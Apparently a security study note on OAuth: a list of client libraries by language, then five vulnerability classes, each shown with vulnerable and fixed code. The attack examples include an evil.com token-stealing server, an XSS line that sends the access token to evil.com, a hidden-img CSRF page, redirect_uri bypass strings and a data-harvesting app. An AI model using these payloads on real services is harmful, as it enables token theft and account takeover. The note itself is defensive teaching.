# 46 - OAuth Overview and Library Ecosystem

## What Is OAuth?

OAuth is an **authorization protocol** that lets users grant third-party applications limited access to their resources (on another service) without sharing their password. For example, a photo printing app can access your Google Photos without knowing your Google password.

### OAuth Flow (Simplified)

```
User          Third-Party App          Resource Server (e.g., Google)
─────         ───────────────          ─────────────────────────────
  │ "Login with Google"  │
  │──────────────────────>│
  │                       │── redirect to Google ──────────────────>│
  │                       │                                         │
  │<──────────── Google login page ─────────────────────────────────│
  │ enters credentials    │                                         │
  │──────────────────────────────────────────────────────────────-->│
  │                       │                                         │
  │                       │<── authorization code ──────────────────│
  │                       │                                         │
  │                       │── exchange code for access token ──────>│
  │                       │<── access token ────────────────────────│
  │                       │                                         │
  │                       │── API request + access token ──────────>│
  │                       │<── user's data ─────────────────────────│
```

The third-party app **never sees the user's password**. It only receives a scoped access token.

## OAuth Libraries by Language

### ActionScript / Flex

| Library | URL |
|---------|-----|
| oauth-as3 | code.google.com/p/oauth-as3/ |
| Flex OAuth Client | arcgis.com OAuth client |

### C / C++

| Library | URL |
|---------|-----|
| QTweetLib | github.com/minimoog/QTweetLib |
| libOAuth | liboauth.sourceforge.net |

### .NET / C#

| Library | URL |
|---------|-----|
| oauth-dot-net | code.google.com/p/oauth-dot-net/ |
| DotNetOpenAuth | dotnetopenauth.net |

### Erlang

| Library | URL |
|---------|-----|
| erlang-oauth | github.com/tim/erlang-oauth |

### Java

| Library | URL |
|---------|-----|
| Scribe | github.com/fernandezpablo85/scribe-java |
| oauth-signpost | code.google.com/p/oauth-signpost/ |

### JavaScript / Objective-C / iOS

| Library | URL |
|---------|-----|
| oauth.js | oauth.googlecode.com/svn/code/javascript/ |
| OAuthCore | bitbucket.org/atebits/oauthcore |
| MPOAuthConnection | code.google.com/p/mpoauthconnection/ |
| Objective-C OAuth | oauth.googlecode.com/svn/code/obj-c/ |

### Perl

| Library | URL |
|---------|-----|
| Net::OAuth | oauth.googlecode.com/svn/code/perl/ |

### PHP

| Library | URL |
|---------|-----|
| tmhOAuth | github.com/themattharris/tmhOAuth |
| oauth-php | code.google.com/p/oauth-php/ |

### Python

| Library | URL |
|---------|-----|
| python-oauth2 | github.com/brosner/python-oauth2 |

### Qt / C++

| Library | URL |
|---------|-----|
| qOauth | github.com/ayoy/qoauth |

### Scala

| Library | URL |
|---------|-----|
| Databinder Dispatch | dispatch.databinder.net |

## OAuth Security Considerations

### 1. Token Leakage via Referer

If an access token appears in the URL (query string or fragment), it leaks through the same vectors as session IDs (see note 45):

```
https://app.com/callback?access_token=abc123
```

When the user clicks any link on this page:

```
GET /some-page HTTP/1.1
Host: external-site.com
Referer: https://app.com/callback?access_token=abc123
```

The external site receives the token in the `Referer` header. The token also appears in browser history, server logs, and proxy logs.

**Vulnerable server-side code (Node.js/Express):**

```javascript
// BAD: Implicit flow — token arrives in URL, stays in browser
app.get('/callback', (req, res) => {
    // Token is in the URL: /callback?access_token=abc123
    const token = req.query.access_token;
    // Page renders with token still in the address bar
    // Any <img>, <a>, or <script> on this page leaks it via Referer
    res.render('dashboard', { token });
});
```

**Safe server-side code (Authorization Code flow):**

```javascript
// GOOD: Auth code flow — code exchanged server-to-server
app.get('/callback', async (req, res) => {
    const code = req.query.code;  // short-lived, one-time-use code

    // Server-to-server request — never touches the browser
    const tokenResponse = await fetch('https://oauth.provider.com/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
            grant_type: 'authorization_code',
            code: code,
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,  // secret never exposed to browser
            redirect_uri: 'https://app.com/callback'
        })
    });

    const { access_token } = await tokenResponse.json();
    // Token is stored in session, never appears in any URL
    req.session.accessToken = access_token;
    res.redirect('/dashboard');
});
```

**Defense:** Use the **authorization code flow** — the callback URL receives a short-lived code, not the token. The code is exchanged for a token in a server-to-server request that never touches the browser.

### 2. CSRF on OAuth Callback

```
Normal flow:
  User clicks "Login with Google" → Google → redirects back to:
  https://app.com/callback?code=xyz123&state=random_value

Attack:
  Attacker initiates OAuth flow with THEIR Google account
  Gets callback URL: https://app.com/callback?code=ATTACKER_CODE
  Tricks victim into visiting this URL
  Victim's account is now linked to attacker's Google account
```

The attacker starts an OAuth flow, gets an authorization code for **their own** account, then sends the callback URL to the victim. The victim's app processes the code and links the attacker's external account to the victim's local account.

**Now the attacker can log into the victim's account** using "Login with Google" with the attacker's Google credentials.

**Vulnerable callback handler (no state check):**

```python
# BAD: No CSRF protection on OAuth callback
@app.route('/callback')
def oauth_callback():
    code = request.args.get('code')

    # Exchange code for token — no state verification!
    token = exchange_code_for_token(code)
    google_user = get_google_user_info(token)

    # Link Google account to current logged-in user
    current_user = get_current_user(session)
    current_user.google_id = google_user['id']
    db.save(current_user)

    # Attacker's Google account is now linked to victim's account!
    return redirect('/dashboard')
```

**Attacker's exploit page:**

```html
<!-- Attacker hosts this page, sends link to victim -->
<html>
<body>
  <h1>Click here for free stuff!</h1>
  <!-- Hidden img auto-visits the callback with attacker's auth code -->
  <img src="https://app.com/callback?code=ATTACKER_AUTH_CODE" style="display:none">
</body>
</html>
```

**Safe callback handler (with state verification):**

```python
# GOOD: CSRF protection via state parameter
@app.route('/login/google')
def start_oauth():
    # Generate random state, bind to session
    state = secrets.token_urlsafe(32)
    session['oauth_state'] = state

    return redirect(
        'https://accounts.google.com/oauth/authorize?'
        f'client_id={CLIENT_ID}&'
        f'redirect_uri=https://app.com/callback&'
        f'state={state}&'
        'response_type=code&'
        'scope=profile email'
    )

@app.route('/callback')
def oauth_callback():
    # Verify state matches session
    if request.args.get('state') != session.get('oauth_state'):
        abort(403, 'CSRF detected: state mismatch')

    code = request.args.get('code')
    token = exchange_code_for_token(code)
    google_user = get_google_user_info(token)

    current_user = get_current_user(session)
    current_user.google_id = google_user['id']
    db.save(current_user)

    return redirect('/dashboard')
```

The attacker can't forge the `state` because they don't have access to the victim's session.

### 3. Open Redirect via redirect_uri

```
Normal:
  https://accounts.google.com/oauth/authorize?
    client_id=app123&
    redirect_uri=https://app.com/callback

Attack (if redirect_uri isn't strictly validated):
  https://accounts.google.com/oauth/authorize?
    client_id=app123&
    redirect_uri=https://evil.com/steal
```

If the authorization server doesn't strictly validate `redirect_uri`, the attacker changes it to their own server. After the user authenticates, Google redirects to:

```
https://evil.com/steal?code=xyz123
```

The attacker receives the authorization code and can exchange it for an access token.

**Vulnerable authorization server (partial match):**

```python
# BAD: Only checks if redirect_uri STARTS WITH the registered domain
REGISTERED_REDIRECT = 'https://app.com'

@app.route('/authorize')
def authorize():
    redirect_uri = request.args.get('redirect_uri')

    # Partial match — easily bypassed!
    if not redirect_uri.startswith(REGISTERED_REDIRECT):
        return 'Invalid redirect_uri', 400

    # Bypassed with:
    # https://app.com.evil.com/steal       (subdomain trick)
    # https://app.com@evil.com/steal       (URL authority trick)
    # https://app.com/redirect?url=evil.com (open redirect chain)

    code = generate_auth_code(user)
    return redirect(f'{redirect_uri}?code={code}')
```

**Attacker's token-stealing server:**

```python
# Attacker's server at evil.com
@app.route('/steal')
def steal_code():
    code = request.args.get('code')

    # Exchange stolen code for access token
    token = requests.post('https://accounts.google.com/oauth/token', data={
        'grant_type': 'authorization_code',
        'code': code,
        'client_id': VICTIM_APP_CLIENT_ID,
        'client_secret': STOLEN_OR_PUBLIC_SECRET,
        'redirect_uri': 'https://evil.com/steal'
    }).json()

    # Now attacker has the victim's access token
    save_stolen_token(token['access_token'])
    return 'Thanks!'
```

**Safe authorization server (exact match):**

```python
# GOOD: Exact match against registered redirect URIs
REGISTERED_REDIRECTS = ['https://app.com/callback']

@app.route('/authorize')
def authorize():
    redirect_uri = request.args.get('redirect_uri')

    # Exact match — no partial matching, no wildcards
    if redirect_uri not in REGISTERED_REDIRECTS:
        return 'Invalid redirect_uri', 400

    code = generate_auth_code(user)
    return redirect(f'{redirect_uri}?code={code}')
```

**Attack variations:**

| Bypass technique | Example |
|-----------------|---------|
| Subdomain | `redirect_uri=https://evil.app.com/callback` |
| Path traversal | `redirect_uri=https://app.com/callback/../../../evil` |
| Open redirect chain | `redirect_uri=https://app.com/redirect?url=https://evil.com` |
| URL encoding | `redirect_uri=https://app.com%40evil.com` |

**Defense:** The authorization server must **exact-match** the registered `redirect_uri`. No wildcards, no partial matching, no subdomain matching.

### 4. Token Scope Abuse

OAuth tokens have **scopes** that limit what the app can access:

```
scope=read_profile          → can only read basic profile
scope=read_profile+email    → can read profile and email
scope=read_profile+email+contacts+drive.full  → way too much access
```

**Malicious app requesting excessive scopes:**

```python
# BAD: Quiz app requests way more access than needed
@app.route('/login')
def login():
    return redirect(
        'https://accounts.google.com/oauth/authorize?'
        f'client_id={CLIENT_ID}&'
        'redirect_uri=https://quiz-app.com/callback&'
        'response_type=code&'
        # A quiz app doesn't need contacts, Gmail, or Drive access!
        'scope=profile email contacts.readonly '
        'gmail.readonly drive.readonly'
    )

# After user grants access:
@app.route('/harvest')
def harvest_data():
    token = session['access_token']

    # Read all contacts
    contacts = requests.get('https://people.googleapis.com/v1/people/me/connections',
        headers={'Authorization': f'Bearer {token}'}).json()

    # Read all emails
    emails = requests.get('https://gmail.googleapis.com/gmail/v1/users/me/messages',
        headers={'Authorization': f'Bearer {token}'}).json()

    # Sell the data...
    send_to_data_broker(contacts, emails)
```

**What the user sees (consent screen):**

```
"Quiz App" wants to:
  ✓ See your basic profile info
  ✓ See your email address
  ✓ See and download your contacts       ← why does a quiz need this?
  ✓ Read your Gmail messages              ← definitely not needed
  ✓ See your Google Drive files           ← not needed at all

         [Allow]    [Deny]
```

**Real-world example:** Facebook/Cambridge Analytica — a quiz app requested `friends` scope. Users granted it. The app harvested data on 87 million users through their friend connections.

**Legitimate app (minimal scopes):**

```python
# GOOD: Only request what's actually needed
@app.route('/login')
def login():
    return redirect(
        'https://accounts.google.com/oauth/authorize?'
        f'client_id={CLIENT_ID}&'
        'redirect_uri=https://quiz-app.com/callback&'
        'response_type=code&'
        'scope=profile'  # Quiz only needs the user's name
    )
```

**Defense:**
- Users should review requested scopes before granting
- Authorization servers should display clear permission descriptions
- Apps should follow the **principle of least privilege** — request only what's needed
- Authorization servers can flag apps requesting unusual scope combinations

### 5. Implicit Flow Risks (Deprecated)

**Authorization Code flow (safe):**

```
Browser → Auth server → redirect with CODE → App server
App server → Auth server: exchange code for TOKEN (server-to-server)
Token never touches the browser
```

**Implicit flow (deprecated):**

```
Browser → Auth server → redirect with TOKEN in URL fragment
https://app.com/callback#access_token=abc123
Token is exposed in the browser!
```

**Vulnerable SPA using implicit flow:**

```javascript
// BAD: Implicit flow — token exposed in URL fragment
function startLogin() {
    window.location.href =
        'https://accounts.google.com/oauth/authorize?' +
        'client_id=' + CLIENT_ID +
        '&redirect_uri=https://app.com/callback' +
        '&response_type=token' +     // "token" = implicit flow!
        '&scope=profile email';
}

// After redirect: https://app.com/callback#access_token=abc123&token_type=bearer
function handleCallback() {
    // Token is in the URL fragment
    const hash = window.location.hash.substring(1);
    const params = new URLSearchParams(hash);
    const accessToken = params.get('access_token');

    // Any XSS on this page can read the token!
    // Browser extensions can read the URL!
    // Token is in browser history!

    fetch('/api/user', {
        headers: { 'Authorization': 'Bearer ' + accessToken }
    });
}
```

**XSS attack stealing the implicit flow token:**

```javascript
// If attacker achieves XSS on app.com:
var token = new URLSearchParams(window.location.hash.substring(1)).get('access_token');
new Image().src = 'https://evil.com/steal?token=' + token;
// Attacker now has the user's Google access token
```

**Safe SPA using Authorization Code flow with PKCE:**

```javascript
// GOOD: Authorization Code flow with PKCE
async function startLogin() {
    // Generate random code_verifier (stored in sessionStorage)
    const codeVerifier = generateRandomString(128);
    sessionStorage.setItem('code_verifier', codeVerifier);

    // Create code_challenge = SHA256(code_verifier), base64url-encoded
    const codeChallenge = await sha256Base64url(codeVerifier);

    window.location.href =
        'https://accounts.google.com/oauth/authorize?' +
        'client_id=' + CLIENT_ID +
        '&redirect_uri=https://app.com/callback' +
        '&response_type=code' +              // "code" not "token"!
        '&scope=profile email' +
        '&code_challenge=' + codeChallenge +  // PKCE challenge
        '&code_challenge_method=S256';
}

// After redirect: https://app.com/callback?code=xyz123 (no token in URL!)
async function handleCallback() {
    const code = new URLSearchParams(window.location.search).get('code');
    const codeVerifier = sessionStorage.getItem('code_verifier');

    // Exchange code + verifier for token
    const response = await fetch('https://accounts.google.com/oauth/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
            grant_type: 'authorization_code',
            code: code,
            client_id: CLIENT_ID,
            redirect_uri: 'https://app.com/callback',
            code_verifier: codeVerifier  // proves we started the flow
        })
    });

    const { access_token } = await response.json();
    // Token never appeared in any URL
    // Even if attacker intercepts the code, they can't exchange it
    // without the code_verifier
}
```

**How PKCE prevents code interception:**

```
Without PKCE:
  Attacker intercepts code → exchanges it → gets token ✓

With PKCE:
  App generates: code_verifier (random secret)
  App sends:     code_challenge = SHA256(code_verifier) to auth server
  Auth server stores the challenge

  Attacker intercepts code → tries to exchange it →
  Auth server asks: "What's the code_verifier?"
  Attacker doesn't have it → exchange fails ✗
```

**Risks of implicit flow:**
- Token visible in browser history
- Token accessible to any JavaScript on the page (XSS → token theft)
- URL fragments can leak via browser extensions
- No refresh tokens — user must re-authenticate when the token expires

**Defense:** OAuth 2.1 **deprecates the implicit flow entirely**. SPAs should use the **authorization code flow with PKCE** (Proof Key for Code Exchange), which keeps the token out of the browser URL.

**Note:** Many of these libraries are historical (OAuth 1.0a era). Modern applications typically use OAuth 2.0/2.1 with libraries maintained by the cloud providers (Google, GitHub, etc.).
